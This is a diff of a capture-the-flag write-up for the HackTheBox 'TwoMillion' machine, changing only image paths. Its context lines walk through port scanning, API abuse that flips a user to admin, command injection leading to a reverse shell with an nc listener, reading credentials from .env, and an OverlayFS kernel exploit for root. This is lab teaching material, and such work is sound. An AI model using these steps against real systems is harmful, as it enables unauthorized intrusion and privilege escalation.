@@ -46,7 +46,7 @@ We begin by testing connectivity to the target:
 ping -c 1 10.10.11.221
 ```
 
-![ping](cases/HackTheBox/Machines/EASY/TwoMillion/screenshots/ping.png)
+![ping](screenshots/ping.png)
 
 The host responds, confirming it is alive.
 
@@ -69,7 +69,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.221 -oG allPorts
 - `-Pn`: Skip host discovery (already confirmed alive)  
 - `-oG`: Output in grepable format
 
-![allports](cases/HackTheBox/Machines/EASY/TwoMillion/screenshots/allports.png)
+![allports](screenshots/allports.png)
 
 Extract ports from the result
 
@@ -77,7 +77,7 @@ Extract ports from the result
 extractPorts allPorts
 ```
 
-![extractports](cases/HackTheBox/Machines/EASY/TwoMillion/screenshots/extractports.png)
+![extractports](screenshots/extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -95,7 +95,7 @@ nmap -sCV -p22,80 10.10.11.221 -oN targeted
 - `-sV`: Detect service versions  
 - `-oN`: Output in human-readable format  
 
-![targeted](cases/HackTheBox/Machines/EASY/TwoMillion/screenshots/targeted.png)
+![targeted](screenshots/targeted.png)
 
 **Findings:**
 
@@ -109,7 +109,7 @@ nmap -sCV -p22,80 10.10.11.221 -oN targeted
 
 Accessing `http://2million.htb` shows the **original 2017 HTB design**. Registration requires an invitation code.  
 
-![website](cases/HackTheBox/Machines/EASY/TwoMillion/screenshots/website.png)
+![website](screenshots/website.png)
 
 The only way to register is by hacking the website and extracting an invitation code. Normal registration is not possible, so we need to go to the Invite screen and run the command in the browser console:
 
@@ -117,7 +117,7 @@ The only way to register is by hacking the website and extracting an invitation 
 makeInviteCode()
 ```
 
-![web_initation_console](cases/HackTheBox/Machines/EASY/TwoMillion/screenshots/web_initation_console.png)
+![web_initation_console](screenshots/web_initation_console.png)
 
 This reveals an ROT13-encoded string. Using `tr`, we decode it:
 
@@ -125,7 +125,7 @@ This reveals an ROT13-encoded string. Using `tr`, we decode it:
 echo "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr" | tr '[A-Za-z]' '[N-ZA-Mn-za-m]'
 ```
 
-![console_message_decode](cases/HackTheBox/Machines/EASY/TwoMillion/screenshots/console_message_decode.png)
+![console_message_decode](screenshots/console_message_decode.png)
 
 The decoded message points us to `http://2million.htb/api/v1/invite/generate`.  
 
@@ -135,7 +135,7 @@ We perform the POST request:
 curl -s -X POST http://2million.htb/api/v1/invite/generate | jq
 ```
 
-![invite_code_created](cases/HackTheBox/Machines/EASY/TwoMillion/screenshots/invite_code_created.png)
+![invite_code_created](screenshots/invite_code_created.png)
 
 The result is still Base64 encoded, so we decode it:
 
@@ -143,12 +143,12 @@ The result is still Base64 encoded, so we decode it:
 echo "OVVSVVMtVDY0TlctMzRSOE0tUDExMUw=" | base64 -d; echo
 ```
 
-![invite_code_decoded_base64](cases/HackTheBox/Machines/EASY/TwoMillion/screenshots/invite_code_decoded_base64.png)
+![invite_code_decoded_base64](screenshots/invite_code_decoded_base64.png)
 
 We now have a valid invite code, register, and log into the platform.  
 
-![registration_screen](cases/HackTheBox/Machines/EASY/TwoMillion/screenshots/registration_screen.png)
-![main_home](cases/HackTheBox/Machines/EASY/TwoMillion/screenshots/main_home.png)
+![registration_screen](screenshots/registration_screen.png)
+![main_home](screenshots/main_home.png)
 
 ---
 ## 3. Foothold
@@ -160,7 +160,7 @@ Inside the user panel, two API endpoints are present:
 - `/api/v1/user/vpn/generate`  
 - `/api/v1/user/vpn/regenerate`  
 
-![access](cases/HackTheBox/Machines/EASY/TwoMillion/screenshots/access.png)
+![access](screenshots/access.png)
 
 We first try to enumerate the API:
 
@@ -168,7 +168,7 @@ We first try to enumerate the API:
 curl -s -X GET "http://2million.htb/api/v1" -v
 ```
 
-![get_api_v1](cases/HackTheBox/Machines/EASY/TwoMillion/screenshots/get_api_v1.png)
+![get_api_v1](screenshots/get_api_v1.png)
 
 The response is *Unauthorized*. Using our session cookie, we retry:
 
@@ -176,7 +176,7 @@ The response is *Unauthorized*. Using our session cookie, we retry:
 curl -s -X GET "http://2million.htb/api/v1" -H "Cookie: PHPSESSID=33p82fj5ja1stpangee056hbu2" | jq
 ```
 
-![get_api_v1_with_cookies](cases/HackTheBox/Machines/EASY/TwoMillion/screenshots/get_api_v1_with_cookies.png)
+![get_api_v1_with_cookies](screenshots/get_api_v1_with_cookies.png)
 
 Now we see two sections: `user` and `admin`.
 
@@ -186,7 +186,7 @@ Checking admin authentication:
 curl -s -X GET "http://2million.htb/api/v1/admin/auth" -H "Cookie: PHPSESSID=33p82fj5ja1stpangee056hbu2" | jq
 ```
 
-![current_user_admin_false](cases/HackTheBox/Machines/EASY/TwoMillion/screenshots/current_user_admin_false.png)
+![current_user_admin_false](screenshots/current_user_admin_false.png)
 
 Our user is not admin. Let's try a POST:
 
@@ -194,7 +194,7 @@ Our user is not admin. Let's try a POST:
 curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie: PHPSESSID=33p82fj5ja1stpangee056hbu2" -v
 ```
 
-![post_vpn_generate](cases/HackTheBox/Machines/EASY/TwoMillion/screenshots/post_vpn_generate.png)
+![post_vpn_generate](screenshots/post_vpn_generate.png)
 
 We are not authorized again.
 
@@ -206,7 +206,7 @@ Trying a PUT request to update settings:
 curl -s -X PUT "http://2million.htb/api/v1/admin/settings/update" -H "Cookie: PHPSESSID=..." | jq
 ```
 
-![post_settings_update_invalid_content_type](cases/HackTheBox/Machines/EASY/TwoMillion/screenshots/post_settings_update_invalid_content_type.png)
+![post_settings_update_invalid_content_type](screenshots/post_settings_update_invalid_content_type.png)
 
 The response indicates `invalid content-type`. After trying several combinations, we fix this with JSON headers:
 
@@ -214,7 +214,7 @@ The response indicates `invalid content-type`. After trying several combinations
 curl -s -X PUT "http://2million.htb/api/v1/admin/settings/update" -H "Cookie: PHPSESSID=33p82fj5ja1stpangee056hbu2" -H "Content-Type: application/json" -d '{"email":"test@test.com", "is_admin":1}' | jq
 ```
 
-![convert_test_user_into_admin](cases/HackTheBox/Machines/EASY/TwoMillion/screenshots/convert_test_user_into_admin.png)
+![convert_test_user_into_admin](screenshots/convert_test_user_into_admin.png)
 
 We confirm our user is now admin:
 
@@ -232,11 +232,11 @@ With admin rights, we attempt VPN generation again:
 curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie: PHPSESSID=33p82fj5ja1stpangee056hbu2" -H "Content-Type: application/json" -d '{"username": "test"}' -v
 ```
 
-![post_vpn_generated](cases/HackTheBox/Machines/EASY/TwoMillion/screenshots/post_vpn_generated.png)
+![post_vpn_generated](screenshots/post_vpn_generated.png)
 
 Testing command injection with metacharacters (`;`, `#`) confirms that code execution is possible
 
-![post_executing_commands](cases/HackTheBox/Machines/EASY/TwoMillion/screenshots/post_executing_commands.png)
+![post_executing_commands](screenshots/post_executing_commands.png)
 
 We exploit it with a reverse shell:
 
@@ -250,7 +250,7 @@ On our listener:
 nc -nlvp 443
 ```
 
-![sending_a_bash](cases/HackTheBox/Machines/EASY/TwoMillion/screenshots/sending_a_bash.png)
+![sending_a_bash](screenshots/sending_a_bash.png)
 
 We successfully obtain a shell.
 
@@ -268,11 +268,11 @@ export TERM=xterm
 
 We enumerate files and discover credentials inside `.env`:
 
-![env_credentials](cases/HackTheBox/Machines/EASY/TwoMillion/screenshots/env_credentials.png)
+![env_credentials](screenshots/env_credentials.png)
 
 This file contains the admin credentials. We also retrieve the **user flag**:
 
-![user_flag](cases/HackTheBox/Machines/EASY/TwoMillion/screenshots/user_flag.png)
+![user_flag](screenshots/user_flag.png)
 
 ---
 ## 4. Privilege Escalation
@@ -283,7 +283,7 @@ Searching for files owned by `admin`:
 find / -user admin 2>/dev/null | grep -vE "sys|proc"
 ```
 
-![find_user](cases/HackTheBox/Machines/EASY/TwoMillion/screenshots/find_user.png)
+![find_user](screenshots/find_user.png)
 
 We discover `/var/mail/admin`, which contains a hint about an unpatched **OverlayFS vulnerability**.
 
@@ -296,12 +296,12 @@ unzip file.zip
 make all
 ```
 
-![unzip_file_in_victims_machine](cases/HackTheBox/Machines/EASY/TwoMillion/screenshots/unzip_file_in_victims_machine.png)
-![execute_make_all](cases/HackTheBox/Machines/EASY/TwoMillion/screenshots/execute_make_all.png)
+![unzip_file_in_victims_machine](screenshots/unzip_file_in_victims_machine.png)
+![execute_make_all](screenshots/execute_make_all.png)
 
 Log in as admin via SSH using the leaked credentials:
 
-![ssh_admin](cases/HackTheBox/Machines/EASY/TwoMillion/screenshots/ssh_admin.png)
+![ssh_admin](screenshots/ssh_admin.png)
 
 Execute the exploit:
 
@@ -309,7 +309,7 @@ Execute the exploit:
 ./exp
 ```
 
-![root_flag](cases/HackTheBox/Machines/EASY/TwoMillion/screenshots/root_flag.png)
+![root_flag](screenshots/root_flag.png)
 
 âœ… **Root flag obtained**
 
